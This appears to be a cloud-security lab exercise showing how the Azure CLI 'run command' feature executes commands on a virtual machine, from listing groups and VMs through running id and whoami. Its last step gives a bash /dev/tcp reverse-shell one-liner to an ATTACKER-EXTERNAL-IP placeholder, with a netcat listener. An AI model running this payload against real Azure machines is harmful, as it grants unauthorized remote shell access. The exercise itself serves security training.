# Use the Azure Run command

## Introduction

Azure provides a 'run command' feature that allows you to execute commands without requiring SSH or SMB/RDP access to a machine. This is very similar to AWS SSM.

## What are we going to cover?

Execute a command remotely and gain shell access to machine.

## Steps to achieve this

- Login into the Azure CLI from the student machine if you haven't already using `az login --use-device-code`
- List all group names

```
az group list
```

- List VMs inside your group. Replace GROUP-NAME from the output of the previous command

```
az vm list -g GROUP-NAME
```

- If your VM is a Linux machine, you can then issue a run command for the Linux command `id`. Replace VM-NAME from the previous command

```
az vm run-command invoke -g GROUP-NAME -n VM-NAME --command-id RunShellScript --scripts "id"
```

- If your VM is a Windows machine, you can then issue a run command for the Windows command `whoami`. Note the change in the value of `--command-id` argument

```
az vm run-command invoke -g GROUP-NAME -n VM-NAME --command-id RunPowerShellScript --scripts "whoami"
```

- To pop a reverse shell, based on the target operating system the following command will change. An example for Linux is shown below. Setup a netcat listener on your AWS Cloudhacker machine on port 9090. Make sure AWS Security Groups has 9090 open as well. Run the following command to obtain a reverse shell from your Azure instance to the Attacker machine.

```
az vm run-command invoke -g GROUP-NAME -n VM-NAME --command-id RunShellScript --scripts "bash -c \"bash -i >& /dev/tcp/ATTACKER-EXTERNAL-IP/9090 0>&1\""
```

## Additional references

- [Azure Run command](https://docs.microsoft.com/en-us/azure/virtual-machines/linux/run-command)
